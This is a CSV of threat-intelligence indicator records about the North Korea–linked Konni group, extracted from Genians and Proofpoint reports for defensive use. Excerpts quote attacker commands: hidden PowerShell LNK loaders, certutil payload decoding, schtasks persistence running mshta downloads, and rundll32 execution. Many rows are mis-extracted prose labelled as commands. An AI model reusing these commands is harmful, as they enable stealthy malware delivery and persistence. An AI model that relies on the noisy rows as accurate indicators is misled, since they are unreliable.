schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--konni,artifact--sha256:e34a86d9a4131e715011bd535232fa06f5c22b9db62366fb8b463f11557d512e,observation--sha256:a281f8b81d947946f4b820353bde8e45416f3bd12f6777a1553ca7afbe1a2b98,command,/c powershell -windowstyle hidden,/c powershell -windowstyle hidden,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:68630314c32bafe8dfd8856e61b56f7116a919772ac6b99da95bcdfd9db3af27,observation--sha256:67fa37010973ae60ae3ac5550e93d9d24caefcd72e228f57d655ab1636071c8c,command,/c powershell -windowstyle hidden $dirPath,/c powershell -windowstyle hidden $dirPath,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:970de12b279e2dd2a071f5fa9a1cda945c6ac36d014c6b1d183ec944c329367d,observation--sha256:23a7bc19b28ec2138ffbb12798c8098d487008d7d2bb9b3001fd19e324b1e726,command,07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로,07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:bffa2b8653b8d3a095bf6d0808363ae6d9d7601fc5c647709fa0cb1cea2061ad,observation--sha256:5cfeb5ba3e4bc6ffcc5086edff3b6b08434e22e05fc669ebbe306f57941c4d75,command,19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로,19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:a1bc3f46381427a2fb39e9c5165f3e694d7305ec4d60d8f7086774a7dae135c6,observation--sha256:188463791d187c2132dac7e7922f4ed25461ee06d19365fe68c8991b077c05fc,command,7 PowerShell – Convert Ticks to DateTime and Vise Versa,7 PowerShell – Convert Ticks to DateTime and Vise Versa,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:c6b088ce9d0b4e2b51b072cacc16d9b4163e2eec4ae149d5aaf9c77369abc6e4,observation--sha256:d6478ce0b2f3c145940d9c0d27e84fbbf758b222bae95dd0a0802199f8a8ab34,command,CommandandScriptingInterpreter:PowerShell,CommandandScriptingInterpreter:PowerShell,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 47}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport 8. 공격지표(Indicator of Attack)8.1. MITREATT&CKMatrix - MITREATT&CK Matrix- Konni GroupDescriptions 9 10 Tactic Technique Description Reconnaissance T1598.002 Phishingfor Information:SpearphishingAttachment T1598.003 Phishingfor Information:SpearphishingLink ResourceDevelopment T1585.002 EstablishAccounts:Email Accounts T1585.003 EstablishAccounts:CloudAccounts Initial Access T1566.002 Phishing:SpearphishingLink T1566.003 Phishing:SpearphishingviaService Execution T1059.00,
1.0.0,actor--konni,artifact--sha256:d0d272566c0995c69e52edc6e8e04682108f6653332bdf8d571668dca8935b3a,observation--sha256:2747cb2abaf5d3b2c095d8f9a0fa04fcb792eb386631de9d80a502d14b49e62d,command,"Firefox), and numerous PowerShell scripts (keylogging, exfiltration of emails and more). Based on Proofpoint’s visibility,","Firefox), and numerous PowerShell scripts (keylogging, exfiltration of emails and more). Based on Proofpoint’s visibility",candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TA427 TA427 may be best known for its use of browser extensions ( STOLEN PENCIL) and HTA-based malware ( BabyShark). TA427 uses credential harvesting, spear-phishing campaigns, infrastructure-scanning tools, and various tools and exploits leaked by the hacker group, The Shadow Brokers . As recently as October 2021, TA427 was still using BabyShark, QuasarRAT, PCRat, browser extensions (Chrome, Edge and Firefox), and numerous PowerShell scripts (keylogging, exfiltration of emails and more). Based ",
1.0.0,actor--konni,artifact--sha256:d1c269dc9168217ffefa32aee60398c767d6fba5f67144929e186c4d184e13c6,observation--sha256:f4e27f9c4c953ae028ccb07661bd5cc94389080f290ecfc5979e9896ae193f20,command,MSHTA to download unknown HTA malware.,MSHTA to download unknown HTA malware,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"TA427 TA427 may be best known for its use of browser extensions ( STOLEN PENCIL) and HTA-based malware ( BabyShark). TA427 uses credential harvesting, spear-phishing campaigns, infrastructure-scanning tools, and various tools and exploits leaked by the hacker group, The Shadow Brokers . As recently as October 2021, TA427 was still using BabyShark, QuasarRAT, PCRat, browser extensions (Chrome, Edge and Firefox), and numerous PowerShell scripts (keylogging, exfiltration of emails and more). Based ",
1.0.0,actor--konni,artifact--sha256:7f0617b53e63383a46c3929afdeb741f4e7264f89756c816e36b17f729182822,observation--sha256:9d26d2e40faec3110ee45111e7df2add8410f0a08de63437fdc83d0e000417b8,command,T1059.001 Command and Scripting Interpreter: PowerShell,T1059.001 Command and Scripting Interpreter: PowerShell,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 45}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 44 07. 공격 지표 (Indicator of Attack) a. MITRE ATT&CK11 Matrix - Konni12 Group Descriptions Tactic Technique Description Reconnaissance T1598.002 Phishing for Information: Spearphishing Attachment Initial Access T1566.001 Phishing: Spearphishing Attachment Execution T1059.001 Command and Scripting Interpreter: PowerShell T1059.003 Command and Scripting Interpreter: Windows Command Shell T1059.005 Command and Scripting Interpreter: Visual Basic T120,
1.0.0,actor--konni,artifact--sha256:b687a613d3cc8ba8984cf14ff50a9188de5fe2fcb5a3daa9dfd83730012008b9,observation--sha256:eef52874af594ae1d94b64f7a6d8c7f82865cd336fa85de65de142080e98c80a,command,VBS 스크립트와 BAT 파일 등을 Powershell 명령어로 풀어 호출하는 과정을 거치게 됩니다.,VBS 스크립트와 BAT 파일 등을 Powershell 명령어로 풀어 호출하는 과정을 거치게 됩니다,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 5 d. 공격 전술 및 기술, 절차 (TTPs) & 킬 스위치 ○ 공격자는 다양한 실전 경험을 통해 효과적인 위협 시나리오를 기획하고, 거점용 C2(명령제어) 서버를 구축해 본격적인 공격을 준비합니다. 그리고 공격 대상자를 선정 후 현혹될 만한 주제의 내용과 악성 파일을 개발해 스피어 피싱 공격을 수행했습니다. ○ LNK 바로가기 타입의 공격은 국내에서 다수 보고되고 있습니다. 특히, APT37 그룹은 자동화된 악성코드 제작도구까지 도입해 활용하는 등 나름 적극적으로 사용 중인데, 코니 그룹이 사용한 코드와는 기술적으로 일부 상이한 구조를 보입니다. ○ APT37 그룹과 다르게 코니 그룹이 사용한 LNK 파일은 포맷 내부에 16 진수 스트링 데이터를 블럭화해 Powershell 명령을 수행합니다. 미끼로 보여줄 정상 (문서) 파일 후위에 악성 ZIP 또는 CAB 압축 포맷이 연이어 내장돼 있는",
1.0.0,actor--konni,artifact--sha256:774a8224b340fd578876461a9d12e0b5373c51989524080c70d5ce266a5b2576,observation--sha256:ccfb4932a8763a7996762f7d6381a5336370e8863d33db39e6c160e0cfb1d97f,command,c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7,c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:d8cc79390679c979825235ef4d0badcf677507645323284811785fe42dfb34ee,observation--sha256:608cd14d78a764ced8268a567580f3e31deafc712518aab78caf49895528d7da,command,c. ‘rundll32.exe’로 파일 실행,c. ‘rundll32.exe’로 파일 실행,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:9f0719b3ab353a8edc44733fb8a0632d215ee37d17b27ea56e1efe7a96b76366,observation--sha256:43e2fc4015bcaf368d34f95cf73889468ea2d000d7cf94d37826f45d071c6c57,command,"certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which","certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which",candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Command Purpose cd /d %USERPROFILE% Set current directory to %USERPROFILE% findstr /b “TVNDR” “[path from ActiveDocument.FullName]”>xtong.txt Use findstr to parse the Word document looking for the string “TVNDR” that follows a new line and then writes all following data to xtong.txt certutil -decode -f xtong.txt xto.c Use certutil to Base64 decode the data in xtong.txt and save to xto.c, which resulted in a CAB file being saved to xto.c expand -f:* xto.c %USERPROFILE% Use the expand command to e",
1.0.0,actor--konni,artifact--sha256:8d398f925d932b6545705c88be7d1a19308522698318fb7c4a4215dd75732aa5,observation--sha256:c38192f05d917aae63a551f274546273503385ae67417cb7f9a66cb306cdeb9a,command,cmd /c schtasks /create /sc minute /mo 15 /tn “Twitter Alarm” /tr “mshta,cmd /c schtasks /create /sc minute /mo 15 /tn “Twitter Alarm” /tr “mshta,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Notable 2021 Malware Campaigns March 2021 In March 2021, TA406 shifted from concentrating exclusively on credential-capture activities to distributing malware via email. Messages purported to be from Chad O’Carroll, a prominent DPRK foreign policy specialist and CEO/Managing Director of Korea Risk Group, and targeted North American entities (Figure 30). The campaign referenced the DPRK short-range cruise missile tests that occurred on or around March 21, 2021. Figure 30. Phishing message with UR",
1.0.0,actor--konni,artifact--sha256:f1fb76006625a92545076cb1a0b15d0c1df445677f8f109548efa4c4415a3ac2,observation--sha256:d20845c2a380a445f0079c04b1cc0afee11b920e2af8131a46b38a047ba32790,command,"pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini)","pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini",candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 30}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.2. ZIP압축파일에포함된BAT파일분석■'stopedge.bat' 파일코드분석 ○ 'stopedge.bat' 파일은 'update.vbs' 파일에 의해 호출되는 배치 명령을 가지고있습니다. @echooff pushd""%~dp0""if exist ""paycom.ini"" (schtasks /create/scminute/mo33/tn""MicrosoftEdgeEasyUpdate"" /tr ""%~dp0install.vbs"" /fdel /f /q%~dp0paycom.ini) call versioninfo.batdel /f /qversioninfo.battimeout -t 5/nobreakdel /f /qupdate.vbs[표4-5] 'stopedge.bat' 파일명령어화면 ○배치파일은명령어내용이화면에출력되지않도록숨기기위해'echo off' 설정을하고, 'pushd ""%~dp0""' 선언으로 명령 프롬프트가 배치 파일이 존재하는 경로로설정합니다. ○다",
1.0.0,actor--konni,artifact--sha256:9f5a0fdbcabb133e51d0bef551fb2dcc320ebbc599dfca7bba2c50068df18813,observation--sha256:a9b1affdb1c94ff9c755a5b23b032966ff6efee287aa105f330f06c010e1542a,command,task with a name of “Twitter Alarm” that executed every 15 minutes and used Mshta to download a payload from an actor-,task with a name of “Twitter Alarm” that executed every 15 minutes and used Mshta to download a payload from an actor-,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Notable 2021 Malware Campaigns March 2021 In March 2021, TA406 shifted from concentrating exclusively on credential-capture activities to distributing malware via email. Messages purported to be from Chad O’Carroll, a prominent DPRK foreign policy specialist and CEO/Managing Director of Korea Risk Group, and targeted North American entities (Figure 30). The campaign referenced the DPRK short-range cruise missile tests that occurred on or around March 21, 2021. Figure 30. Phishing message with UR",
1.0.0,actor--konni,artifact--sha256:449ef46ebde45555b63137333a963404b458168e6384b51c0193ce2827520af5,observation--sha256:c16acca1e82f099f46ee27a725d25f4e077c03ef5a17c91bef384a69a1ccee3d,command,○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상,○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 37 b. APT37 와 Konni LNK 공격 차이점 ○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상 문서(HWP, PDF 등)와 악성 BAT 파일의 위치를 지정해 사용합니다. 반면, Konni LNK 악성 코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을 먼저 사용합니다. ○ Base64 인코딩된 값을 디코딩해 비교해 보면 일부 유사한 패턴을 가지고 있지만, APT37 의 경우 정상과 악성 파일이 그대로 내부에 삽입된 형태를 가진다면, Konni 의 경우 CAB 또는 ZIP 압축 형태를 포함한 점이 서로 다릅니다. 따라서, Konni LNK 경우 압축을 해제하는 설정 값들이 추가로 존재합니다. APT37 LNK Konni LNK -Recurse *.lnk ^| where-object {",
1.0.0,actor--konni,artifact--sha256:86a8088efda9a1d874248edaba6cc6dbe1047825390c881352565289bbcd63ff,observation--sha256:a9e6f5587fa98ad970d8d32a8589301526f3e348ad66f5b7186c48e013ef729f,command,"○ Genian EDR10 운영 환경에서는 코니 위협의 대표적 감염 기술인 VBS, BAT, Powershell","○ Genian EDR10 운영 환경에서는 코니 위협의 대표적 감염 기술인 VBS, BAT, Powershell",candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 40 b. Genian EDR 제품을 통한 효과적인 대응 ○ Genian EDR10 운영 환경에서는 코니 위협의 대표적 감염 기술인 VBS, BAT, Powershell 행위 이벤트와 흐름을 빠르고 정확히 탐지할 수 있도록 가시성을 제공합니다. 코니의 이상행위 위협 이벤트를 시각화하여 단계별 흐름을 신속하게 파악할 수 있습니다. ○ 본 보고서에서 기술한 코니 시리즈는 지난 수년간 한국의 엔드포인트 상대로 지속적인 공격을 수행하고 있습니다. 이에 보다 효과적인 대응을 위해 Genian EDR 솔루션과 같은 행위 기반 탐지 기술로 선제적 차단 방안이 요구됩니다. ○ 아울러 비정상적 프로세스 행위를 실시간으로 모니터링하고, 신뢰할 수 없는 이메일의 첨부 파일에 함부로 접근하지 않는 보안 의식도 중요합니다. 특히, 현재 성행하고 있는 LNK 유형의 악성 파일에 노출되지 않기 위해 압축 파일의 경우 작",
1.0.0,actor--konni,artifact--sha256:e7e6b67f956ddf94b4a0ddb6b8dc49d67569a9a50c77a389c9513d4aad8a68a6,observation--sha256:b128e0d93bc112138e236a49036e701da6b4b8decbb44c63b700f1ed1ef5bc5d,command,"○ LNK 내부의 Powershell 명령을 통해'230823- 협의회참여단체현황. xlsx' 정상문서를임시경로( Temp) 에생성하고실행합니다. 실제참여단체현황정보가포함되어있어, 사전에유출된정상문서가본공격에도용된것으로추정됩니다.","○ LNK 내부의 Powershell 명령을 통해'230823- 협의회참여단체현황. xlsx' 정상문서를임시경로( Temp) 에생성하고실행합니다. 실제참여단체현황정보가포함되어있어, 사전에유출된정상문서가본공격에도용된것으로추정됩니다",candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 11}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport /q/cpowershell -windowstylehidden""$dKN10GCpAw=Get-Location;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} |Select-Object -ExpandPropertyFullName;if($H7wszqY5I.length-eq0){$dKN10GCpAw=$env:Temp;$H7wszqY5I =Get-ChildItem-Path$dKN10GCpAw-Recurse*.lnk| where-object {$_.length-eq0x00AE6666} | Select-Object -ExpandPropertyFullName;};$dKN10GCpAw=Split-Path$H7wszqY5I;$JizBEr =New-Object System.IO.FileStream($H7wszqY5I,[System.IO.Fi",
1.0.0,actor--konni,artifact--sha256:7d3373840f2954b74d858fdb5807b74b636e0519cac7b5171644b29315087f8d,observation--sha256:6523378269e2ae9f7c08da8432da82e423db562c8413a617eeb28b3ab929b539,command,"○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어","○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어",candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○'securityMail_1031.html.lnk', 'securityMail_1101.html.lnk' 파일명의바로가기파일이며, 2중확장자기법을동일하게사용했습니다. [그림5-4] 카카오뱅크보안메일유사변종LNK악성코드명령어화면 ○ Powershell 명령어를 통해 내장된 정상 html 파일을 생성해 보여주고, ZIP 압축파일과 BAT 파일을 통해 'mfc100.dll' 라이브러리호출이진행됩니다. 'mfc100.dll'파일은ZIP 압축내부에포함돼있고, 배치파일내'rundll32.exe' 명령과Run인자값이조합되어실행됩니다. 여기서사용된'mfc100.dll' 파일은'Themida' 상용소프트웨어 6 프로텍터로 패킹되어 있으며, 'naver-file[.]com' (5.8.71.81 [일본]) 호스트를C2 로사용하는AmadeyBot 유형입니다. ○당시식별된Passive DNS중에는'nate-download[.]com' (172.86.123.0",
1.0.0,actor--konni,artifact--sha256:d8beb275c90351928723b3334c0767ee898525b39eecb8bab72b797f55365c20,observation--sha256:2396d591e00a3f8fce8412a3acad9eb02a76b5c6116e22baf6a1be47961acac4,command,○ Powershell 명령은 ‘$temple’ 영역에 선언된 16 진수 블럭을 호출해 사용합니다. 이 값을,○ Powershell 명령은 ‘$temple’ 영역에 선언된 16 진수 블럭을 호출해 사용합니다. 이 값을,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 14 ○ Powershell 명령은 ‘$temple’ 영역에 선언된 16 진수 블럭을 호출해 사용합니다. 이 값을 ASCII 코드로 변환하면 상세 명령을 확인할 수 있습니다. $LsUvVpNHlCfpw = Get - Location; $SEvhgMDD = Get - ChildItem - Path $LsUvVpNHlCfpw - Recurse * .lnk | where - object { $_.length - eq 0x1466956A } | Select - Object - ExpandProperty FullName; if ($SEvhgMDD.length - eq 0) { $LsUvVpNHlCfpw = $env: Temp; $SEvhgMDD = Get - ChildItem - Path $LsUvVpNHlCfpw - Recurse * .lnk | where - object { $_.length - e,
1.0.0,actor--konni,artifact--sha256:04d380fafb37e65904d8d60dc38440b5a8a1ba48fc925781677238204f7c2d60,observation--sha256:4594db7f22cd193ebde62e83f14d978e7eff089bbc334a6a97ff7f6dd1151daa,command,○ ‘19288086.bat’ 파일은 환경변수 조건에 따라 Powershell 명령을 통해 [RC4+Base64],○ ‘19288086.bat’ 파일은 환경변수 조건에 따라 Powershell 명령을 통해 [RC4+Base64,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 33 f. ‘19288086.bat’ ○ ‘19288086.bat’ 파일은 환경변수 조건에 따라 Powershell 명령을 통해 [RC4+Base64] 암호화와 다운로드 설정 루틴을 지니고 있습니다. 파일명 19288086.bat MD5 b4461d68a8026981ab47294c2c7b5d91 SHA1 f1b4748d50a38952edc2f0953cd270ec17bb5b2a SHA256 79f61da076edf4cc9434e1c1f25ca62664d5f0bc5b9b91736 60f3089491eb8fe [표 14] 19288086.bat 파일 HASH 정보 화면 ○ 변수명 (if not ""%ypczipzqWxLByMQH%"" == ""0"") 에 따라 암호화 루틴이 작동하는데, ‘73888454.bat’ 파일에서 호출 될 때 사용이 됩니다. [그림 25] 19288086.bat 내부 코드 화면",
